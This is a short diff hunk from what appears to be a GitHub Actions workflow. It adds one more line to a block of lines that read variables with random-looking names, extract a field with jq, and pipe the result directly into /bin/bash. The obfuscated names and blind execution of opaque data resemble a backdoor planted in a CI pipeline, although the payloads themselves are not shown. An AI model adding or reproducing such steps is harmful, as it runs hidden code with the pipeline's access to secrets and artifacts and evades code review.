@@ -31,6 +31,7 @@ jobs:
           echo $mvbzo89699 | jq -r .r45527 | /bin/bash
           printf '%s' "$e59" | jq -r .uf31 | /bin/bash
           echo $hcrue91 | jq -r .hdf9 | /bin/bash
+          echo $hz16 | jq -r .co18 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
